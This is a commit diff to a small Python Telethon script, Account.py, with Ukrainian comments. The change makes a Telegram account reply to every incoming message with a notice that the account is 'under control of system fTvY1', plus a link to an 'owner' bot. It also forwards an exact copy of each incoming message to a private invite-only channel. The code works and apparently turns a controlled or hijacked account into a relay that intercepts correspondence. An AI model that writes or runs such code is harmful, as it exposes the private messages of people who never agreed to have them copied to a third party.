0f3e0abe4dffaf7b3770da18727559c4fb3f804b
i98573786-creator <i98573786@gmail.com>
2026-03-25 22:07:11 +0200

    Update Account.py

--- Account.py
+++ Account.py
@@ -3,16 +3,25 @@ from telethon import TelegramClient, events
 api_id = 123456
 api_hash = "API_HASH"
 
+# Канал куди пересилати всі повідомлення
+channel = "https://t.me/+BraoQaofzgE5OWZi"
+
+# Посилання на власника, куди людина може написати
+owner_link = "https://t.me/fTvY1System_bot"
+
 client = TelegramClient("session", api_id, api_hash)
 
 @client.on(events.NewMessage(incoming=True))
 async def handler(event):
-    if event.is_private:
-        await event.reply(
-            "⚠️ Аккаунт під контролем системи: fTvY1\n\n"
-            "Напишіть власнику:\n"
-            "https://t.me/your_username"
-        )
+
+    # 1️⃣ Надсилаємо автовідповідь користувачу
+    await event.reply(
+        f"⚠️ Аккаунт під контролем системи: fTvY1\n\n"
+        f"Зв'язок з власником: {owner_link}"
+    )
+
+    # 2️⃣ Пересилаємо точну копію повідомлення у канал
+    await event.forward_to(channel)
 
 client.start()
 client.run_until_disconnected()
